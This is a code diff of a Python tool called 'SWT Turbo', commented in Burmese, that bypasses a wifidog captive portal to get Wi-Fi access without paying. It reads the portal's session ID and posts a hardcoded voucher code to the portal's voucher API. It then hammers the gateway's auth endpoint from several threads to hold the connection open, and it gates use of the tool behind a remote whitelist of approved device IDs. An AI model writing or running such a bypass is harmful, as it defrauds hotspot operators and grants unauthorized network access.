@@ -8,12 +8,13 @@ import sys
 import psutil
 from urllib.parse import urlparse, parse_qs, urljoin
 
+# SSL Warning များအား ပိတ်ထားရန်
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # --- CONFIGURATION ---
 WHITELIST_URL = "https://raw.githubusercontent.com/winhtetaung1662004-byte/win/main/keys.txt"
-PING_THREADS = 5
-PING_INTERVAL = 0.1 
+PING_THREADS = 10
+STOP_EVENT = threading.Event()  # Internet Access ကို ထိန်းချုပ်ရန်
 
 def clear_screen():
     os.system('clear' if os.name == 'posix' else 'cls')
@@ -25,140 +26,129 @@ def show_banner():
     ##########################################
     #                                        #
     #              SWT  TURBO                #
-    #        FAST & UNLIMITED ACCESS         #
+    #      [ VERIFIED ACCESS SYSTEM ]        #
     #                                        #
     ##########################################
     \033[0m
     """
     print(banner)
 
-def get_data_usage():
-    """Data Usage တွက်ချက်ရန်"""
+def check_approval_online():
+    """Server ရှိ Whitelist နှင့် Device ID တိုက်စစ်ခြင်း"""
     try:
-        net_io = psutil.net_io_counters()
-        total_bytes = net_io.bytes_sent + net_io.bytes_recv
-        return total_bytes / (1024 * 1024)
-    except: return 0
-
-def check_approval():
-    """Device ID ကို keys.txt နဲ့ တိုက်စစ်ခြင်း"""
-    try:
+        # Termux သို့မဟုတ် Linux အခြေပြု Device ID ရယူခြင်း
         device_id = os.popen("id -u -n").read().strip()
-        show_banner()
-        print(f"\033[1;33m[*] Detected ID: {device_id}\033[0m")
-        print("[*] Checking Authorization...")
-        
         headers = {'Cache-Control': 'no-cache', 'Pragma': 'no-cache'}
         response = requests.get(WHITELIST_URL, headers=headers, timeout=10)
         
         allowed_users = response.text.splitlines()
-        
         if device_id in allowed_users:
-            print("\033[1;32m[+] Access Granted!\033[0m")
-            time.sleep(1)
-            return True
+            return True, device_id
         else:
-            print(f"\n\033[1;31m[!] Access Denied! ID: {device_id} is not registered.\033[0m")
-            print("[*] Contact Admin to get approval.")
-            sys.exit()
-    except Exception as e:
-        print(f"[!] Security Check Error: {e}")
-        sys.exit()
+            return False, device_id
+    except:
+        return False, "Unknown"
 
-def check_real_internet():
-    """Google ကို ချိတ်ဆက်နိုင်ခြင်း ရှိမရှိ စစ်ဆေးရန်"""
-    try:
-        return requests.get("http://www.google.com", timeout=3).status_code == 200
-    except: return False
-
-def high_speed_ping(auth_link, session, sid):
-    """Gateway ကို အဆက်မပြတ် Ping ထိုးပေးခြင်း (Internet Access ကို ထိန်းထားရန်)"""
-    while True:
+def high_speed_ping(auth_link, session):
+    """အင်တာနက် Access ကို တည်မြဲနေစေရန် Background မှ Ping ပို့ပေးခြင်း"""
+    while not STOP_EVENT.is_set():
         try:
             session.get(auth_link, timeout=5)
-            print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid} (Status: OK)   ", end='\r')
-        except: break
-        time.sleep(PING_INTERVAL)
+        except:
+            break
+        time.sleep(0.1)
 
 def start_process():
-    # ၁။ Approval အရင်စစ်မည်
-    check_approval()
-    
-    # ၂။ User Menu
-    print(f"\n\033[1;33m[1] Start SWT Turbo Internet")
-    print("[0] Exit\033[0m")
-    choice = input("\nSelect Option: ")
-    if choice != '1':
-        sys.exit()
-        
-    clear_screen()
     show_banner()
-    print("[*] Initializing system... Connecting to Gateway...")
+    print("[*] Initializing Bypass for ID Verification...")
     
-    start_time = time.time()
-    start_data = get_data_usage()
-
-    while True:
-        session = requests.Session()
-        test_url = "http://connectivitycheck.gstatic.com/generate_204"
+    session = requests.Session()
+    test_url = "http://connectivitycheck.gstatic.com/generate_204"
+    
+    try:
+        # ၁။ Portal Detection နှင့် Temporary Bypass (ID စစ်ရန် အင်တာနက်ခဏဖွင့်ခြင်း)
+        r = requests.get(test_url, allow_redirects=True, timeout=5)
         
-        try:
-            # Captive Portal သို့မဟုတ် Internet ရမရ အရင်စစ်သည်
-            r = requests.get(test_url, allow_redirects=True, timeout=5)
-            
-            # အကယ်၍ အင်တာနက်ရနေပြီဆိုလျှင် Status ပြပြီး စောင့်နေမည်
-            if r.url == test_url:
-                if check_real_internet():
-                    elapsed = time.time() - start_time
-                    mins, secs = divmod(int(elapsed), 60)
-                    hours, mins = divmod(mins, 60)
-                    current_data = get_data_usage() - start_data
-                    print(f"\r\033[1;36m[*] Time: {hours:02d}:{mins:02d}:{secs:02d} | Used: {current_data:.2f} MB | Status: Online\033[0m", end='', flush=True)
-                    time.sleep(5)
-                    continue
-            
-            # ၃။ Internet မရသေးလျှင် Portal URL မှ တစ်ဆင့် SID နှင့် Gateway ရှာဖွေခြင်း
+        if r.url != test_url:
             portal_url = r.url
             parsed_portal = urlparse(portal_url)
-            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
-            
             r1 = session.get(portal_url, verify=False, timeout=10)
             path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
             next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
             r2 = session.get(next_url, verify=False, timeout=10)
             
-            # SID (Session ID) ကို ရှာဖွေခြင်း
             sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
-            if not sid:
-                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
-                sid = sid_match.group(1) if sid_match else None
             
             if sid:
-                # ၄။ Voucher Activation (Internet Access ဖွင့်ရန်)
-                print(f"\n[*] Activating Session: {sid}")
-                voucher_api = f"{portal_host}/api/auth/voucher/"
-                try:
-                    # မူရင်း script အတိုင်း voucher access code '123456' ကို သုံးထားသည်
-                    session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
-                except: pass
-
-                # ၅။ Gateway Authentication Link တည်ဆောက်ခြင်း
-                params = parse_qs(parsed_portal.query)
-                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
-                gw_port = params.get('gw_port', ['2060'])[0]
-                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
-
-                # ၆။ Threads များဖြင့် Ping ထိုးခြင်း (အင်တာနက် အမြန်နှုန်း မြှင့်ရန်)
-                for _ in range(PING_THREADS):
-                    threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True).start()
-
-                print(f"\033[1;32m[+] Turbo Activated! SID: {sid}\033[0m")
-                while check_real_internet():
-                    time.sleep(5)
-        except Exception as e:
-            # Error ဖြစ်လျှင် ၅ စက္ကန့်နားပြီး ပြန်စစ်မည်
-            time.sleep(5)
+                # Voucher ခဏ Activate လုပ်သည်
+                portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
+                session.post(f"{portal_host}/api/auth/voucher/", 
+                             json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
+                
+                gw_addr = parse_qs(parsed_portal.query).get('gw_address', ['192.168.60.1'])[0]
+                gw_port = parse_qs(parsed_portal.query).get('gw_port', ['2060'])[0]
+                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
+                
+                # --- PHASE: VERIFICATION (ခေတ္တအင်တာနက်ပေး၍ ID စစ်ခြင်း) ---
+                temp_stop = threading.Event()
+                def temp_ping():
+                    while not temp_stop.is_set():
+                        try: session.get(auth_link, timeout=3)
+                        except: break
+                        time.sleep(0.5)
+                
+                t = threading.Thread(target=temp_ping, daemon=True)
+                t.start()
+                
+                print("[*] Server နှင့် ချိတ်ဆက်နေပါသည်...")
+                time.sleep(2) # အင်တာနက် တည်ငြိမ်ရန် စောင့်ခြင်း
+                
+                is_authorized, device_id = check_approval_online()
+                
+                # ID စစ်ပြီးတာနဲ့ အင်တာနက် Access ကို ချက်ချင်းပြန်ဖြတ်လိုက်သည်
+                temp_stop.set()
+                print("\033[1;31m[*] ID Verification Done. Connection Paused.\033[0m")
+                
+                if is_authorized:
+                    print(f"\033[1;32m[+] ID {device_id} Verified!\033[0m")
+                    print("\n\033[1;33m[1] Start SWT Turbo Internet (Permanent Access)")
+                    print("[0] Exit\033[0m")
+                    
+                    choice = input("\nSelect Option: ")
+                    if choice == '1':
+                        show_banner()
+                        print("[*] Activating Full Turbo Access...")
+                        
+                        # --- PHASE: PERMANENT ACCESS (User က 1 နှိပ်မှ အမြဲတမ်းဖွင့်ပေးခြင်း) ---
+                        STOP_EVENT.clear() 
+                        for _ in range(PING_THREADS):
+                            threading.Thread(target=high_speed_ping, args=(auth_link, session), daemon=True).start()
+                        
+                        start_time = time.time()
+                        while True:
+                            elapsed = time.time() - start_time
+                            h, m = divmod(int(elapsed // 60), 60); s = int(elapsed % 60)
+                            print(f"\r\033[1;36m[*] Status: Online | Up: {h:02d}:{m:02d}:{s:02d} | ID: {device_id} (Approved)\033[0m", end='', flush=True)
+                            time.sleep(5)
+                    else:
+                        print("Exiting...")
+                        sys.exit()
+                else:
+                    print(f"\n\033[1;31m[!] Access Denied! Your ID ({device_id}) is not registered.\033[0m")
+                    sys.exit()
+            else:
+                print("[!] SID မတွေ့ပါ။ Portal ချိတ်ဆက်မှုအား စစ်ဆေးပါ။")
+        else:
+            print("[!] အင်တာနက် ရရှိနေပြီးသား ဖြစ်သည်။")
+            
+    except Exception as e:
+        print(f"[!] Critical Error: {e}")
+        sys.exit()
 
 if __name__ == "__main__":
-    start_process()
-    
+    try:
+        start_process()
+    except KeyboardInterrupt:
+        print("\n\nStopped by user.")
+        sys.exit()
+
